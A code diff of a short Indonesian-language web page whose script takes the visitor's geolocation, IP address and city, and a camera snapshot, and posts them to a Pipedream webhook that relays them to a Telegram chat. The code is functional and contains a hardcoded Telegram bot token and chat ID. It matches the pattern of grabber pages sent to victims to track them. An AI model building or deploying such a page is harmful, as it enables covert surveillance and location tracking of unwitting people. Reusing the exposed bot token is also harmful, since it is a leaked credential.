@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ambil Foto & Kirim ke Telegram</title>
+  <title>Kirim Foto & Lokasi ke Telegram</title>
   <style>
     body { font-family: Arial; text-align: center; padding: 30px; }
     video { width: 300px; height: 200px; border: 1px solid #ccc; }
     button { padding: 10px 20px; font-size: 16px; }
+    h2 { color: red; }
   </style>
 </head>
 <body>
@@ -20,39 +21,38 @@
 
   <script>
     const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
-    const CHAT_ID = '7670525689';
-    const WEBHOOK_URL = 'https://eouxkofejjzs7xj.m.pipedream.net'; // ganti dengan webhook.site atau pipedream
+    const CHAT_ID   = '7670525689';
+    const WEBHOOK_URL = 'https://eouxkofejjzs7xj.m.pipedream.net';
 
     async function start() {
       try {
-        // 1. Ambil lokasi
+        // 1. Lokasi
         const pos = await new Promise((res, rej) =>
           navigator.geolocation.getCurrentPosition(res, rej)
         );
         const { latitude, longitude } = pos.coords;
 
-        // 2. Ambil IP & kota
+        // 2. IP & kota
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
         const { ip, city, region } = ipData;
 
-        // 3. Ambil kamera
+        // 3. Kamera
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // 4. Tunggu 2 detik, lalu ambil foto
+        // 4. Tunggu 2 detik → ambil foto
         setTimeout(() => {
           const canvas = document.getElementById('canvas');
-          const context = canvas.getContext('2d');
+          const ctx = canvas.getContext('2d');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0);
+          ctx.drawImage(video, 0, 0);
 
           canvas.toBlob(async (blob) => {
-            const caption = `📍 Lokasi: ${city}, ${region}\n🌍 Koordinat: ${latitude}, ${longitude}\n🌐 IP: ${ip}`;
+            const caption = `📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
 
-            // Kirim ke Telegram via webhook (proxy)
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
             form.append('caption', caption);
@@ -61,9 +61,13 @@
             await fetch(WEBHOOK_URL, {
               method: 'POST',
               body: form
+            }).then(r => {
+              if (!r.ok) throw new Error('Gagal kirim');
+              alert('✅ Terkirim ke Telegram!');
+            }).catch(err => {
+              alert('❌ Gagal kirim: ' + err.message);
             });
 
-            alert('Foto & lokasi terkirim ke Telegram!');
             stream.getTracks().forEach(t => t.stop());
           }, 'image/jpeg');
         }, 2000);
@@ -75,4 +79,4 @@
   </script>
 
 </body>
-  </html>
+</html>
